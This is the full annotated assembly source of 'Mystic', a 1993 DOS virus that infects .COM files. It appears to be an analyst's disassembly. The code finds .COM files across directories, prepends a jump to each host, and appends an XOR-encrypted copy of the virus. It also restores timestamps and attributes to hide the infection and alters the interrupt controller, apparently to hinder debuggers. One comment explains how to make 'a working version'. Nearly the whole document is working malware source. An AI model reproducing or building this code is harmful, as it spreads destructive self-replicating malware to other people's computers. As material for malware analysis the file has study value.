


PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        MY2				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   15-Apr-93					         ÛÛ
;ÛÛ      Passes:    5	       Analysis Options on: A		         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

psp_cmd_size	equ	80h
CRYPT_START	equ	0Fh			;*
COUNTER		equ	0B2h			;*

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

my2		proc	far

start:
		jmp	BEGIN
		int	21h			; DOS Services  ah=function 00h
						;  terminate, cs=progm seg prefx
		db	4995 dup (90h)
BEGIN:
		call	SET_POINTERS

my2		endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;         Set pointers
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

SET_POINTERS	proc	near
		pop	bp			; Load address of SET_POINTERS into BP
		sub	bp,106h			; Subtract original address
		lea	bx,[bp+112h]		; Load address of BEGIN_CRYPT
		call	CRYPT

BEGIN_CRYPT:					; Load address of QUIT
		lea	si,[bp+269h]		; Load effective addr
		mov	di,100h			; Destination is CS:0100
		movsb				; Mov [si] to es:[di]
		movsw				; Move 3 bytes to address 100 [MOV
						;  AX,4C00]
		in	al,21h			; port 21h, 8259-1 int IMR
		mov	byte ptr [bp+123h],2

;  ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ
;  Û  Change next instruction to:  OR AL,2 (i.e. set bit 1)  Û
;  Û  then OUT the new value.  This changes the PIC value    Û
;  Û  from B8 to BA on the test computer.                    Û
;  Û  This appears to be an attempt to disable debuggers.    Û
;  ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ

Change_8259:
		or	al,0
		out	21h,al			; port 21h, 8259-1 int comands
		mov	byte ptr [bp+123h],0
		mov	ah,1Ah			; Set DTA
		lea	dx,[bp+285h]		; Set DTA to begin at BP+285
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA(disk xfer area) ds:dx
		lea	si,[bp+2B3h]		; Load effective addr
		mov	ah,47h			; Get current directory
		xor	dx,dx			; Default drive
		int	21h			; DOS Services  ah=function 47h
						;  get present dir,drive dl,1=a:
						;   ds:si=ASCIIZ directory name
FIND_FIRST:
		mov	ah,4Eh			; 'N'
		mov	cx,27h			; normal, hidden, read-only, system,
						;  or archive attributes
		call	FIND_INFECT
		lea	dx,[bp+26Ch]		; Load effective addr
		mov	ah,3Bh			; Set directory
		int	21h			; DOS Services  ah=function 3Bh
						;  set current dir, path @ ds:dx
		jnc	FIND_FIRST		; Jump if carry=0
		retn
SET_POINTERS	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;         Find file and	infect
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

FIND_INFECT	proc	near

FIND_FILE:					; Load address of FILESPEC in DX
		lea	dx,[bp+263h]		; Load effective addr
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
		jnc	FOUND			; Jump if carry=0
		jmp	NOT_FOUND
FOUND:
		lea	si,[bp+29Ah]		; Load effective addr
		lea	di,[bp+27Ch]		; Load effective addr
		mov	cx,9
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	ax,4301h		; Change attribute
		xor	cx,cx			; normal attributes
		lea	dx,[bp+2A3h]		; Buffer at BP+2A3 holds filename
		int	21h			; DOS Services  ah=function 43h
						;  set attrb cx, filename @ds:dx
		mov	ax,3D02h		; Open file read/write
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		xchg	ax,bx			; File handle to BX
		mov	cx,3			; Read 3 bytes
		lea	dx,[bp+269h]		; Buffer at BP+269 holds 3 bytes
		mov	ah,3Fh			; Read file
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer

IS_INFECTED?:					; Compare file size minus virus
						;  size minus 3
		mov	dx,[bp+281h]
		sub	dx,17Ch
		cmp	[bp+26Ah],dx		; Does [BP+281]=BP?
		jne	LSEEK_BOF		; NO : Infect
		mov	ah,3Eh			; YES: close file
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		mov	ah,4Fh			; Find next file
		jmp	short FIND_FILE
Virus_Name	db	'`Mystic', 27h
Author		db	' by Digital Alchemy'
		db	2, 0

LSEEK_BOF:					; Seek to beginning of file
		mov	ax,4200h
		xor	cx,cx			; no offset
		xor	dx,dx			; no offset
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset

;  ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ
;  Û  Here the beginning jump is calculated and written.     Û
;  ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ

CALC_JUMP:
		mov	word ptr [bp+2B0h],0E9h
		mov	ax,[bp+281h]
		sub	ax,3
		mov	[bp+2B1h],ax
		mov	cx,3			; Write 3 bytes
		mov	ah,40h			; Write to file
		lea	dx,[bp+2B0h]		; 3 bytes begin at BP+2B0
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		mov	ax,4202h		; Lseek EOF
		xor	dx,dx			; no offset
		xor	cx,cx			; no offset
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	ah,2Ch			; Get time
		int	21h			; DOS Services  ah=function 2Ch
						;  get time, cx=hrs/min, dx=sec
		mov	[bp+274h],dx		; Move seconds, hundreds to [BP+274]
		mov	ax,cs
		add	ax,100h
		mov	es,ax			; New segment [ES=CS+100] holds crypt
		mov	cx,0BDh			; BDh (179d) bytes
		lea	si,[bp+103h]		; Source is BP+103
		xor	di,di			; Destination is ES:0000
		rep	movsw			; Rep when cx >0 Mov [si] to es:[di]
		inc	word ptr es:COUNTER	; Increment infection counter,
                                                ;  which is the byte following
                                                ; "Digital Alchemy"
		push	bx
		mov	bx,CRYPT_START
		push	es
		pop	ds			; DS=ES, which is CS+100
		call	CRYPT
		pop	bx			; Get handle from stack
		xor	dx,dx			; Write from DS:0000 (DS=ES)
		mov	cx,179h			; Write 179h bytes (virus length)
		mov	ah,40h			; Write to file
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		mov	ax,5701h		; Reset file's date & time
		mov	cx,[bp+27Dh]		; File time stored at BP+27D
		mov	dx,[bp+27Fh]		; File date stored at BP+27F
		int	21h			; DOS Services  ah=function 57h
						;  set file date+time, bx=handle
						;   cx=time, dx=time
		mov	ah,3Eh			; Close file
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		push	cs
		pop	ds			; Restore DS to equal CS
		push	cs
		pop	es			; Restore ES to equal CS
		xor	cx,cx			; Zero register
		mov	cl,[bp+27Ch]		; Get original attributes from BP+27C
		mov	ax,4301h		; Reset attributes
		lea	dx,[bp+2A3h]		; File name is at BP+2A3
		int	21h			; DOS Services  ah=function 43h
						;  set attrb cx, filename @ds:dx
NOT_FOUND:
		retn
FIND_INFECT	endp

		push	cs
		pop	es
		mov	dx,psp_cmd_size
		mov	ah,1Ah			; Reset DTA to original value
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA(disk xfer area) ds:dx
		lea	dx,[bp+2B3h]		; BP+2B3 holds directory (or 0)
		mov	ah,3Bh			; Set new directory
		int	21h			; DOS Services  ah=function 3Bh
						;  set current dir, path @ ds:dx
		mov	ax,100h
		push	ax			; Push 100 onto stack
		add	bp,3
		mov	cx,bp
		xor	ax,ax			; Zero register
		xor	bx,bx			; Zero register
		xor	dx,dx			; Zero register
		xor	si,si			; Zero register
		xor	di,di			; Zero register
		xor	bp,bp			; Zero register
		retn				; Return to address 100 (from stack)
FILESPEC	db	'*.COM', 0
QUIT:
		mov	ax,4C00h
		db	 2Eh, 2Eh, 00h

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;         Decrypt and Encrypt
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

CRYPT		proc	near
		mov	cx,0AEh

;  ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ
;  Û  Encrypt AEh words, starting at [BX], where BX=ES:000F  Û
;  Û  Change value of 233B to 0000 for a working version.    Û
;  ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ

XOR_WORD:
		xor	word ptr [bx],233Bh
                ;xor     word ptr [bx],0000     ;Change here
		add	bx,2
		loop	XOR_WORD		; Loop if cx > 0

		retn
CRYPT		endp


seg_a		ends


		end	start

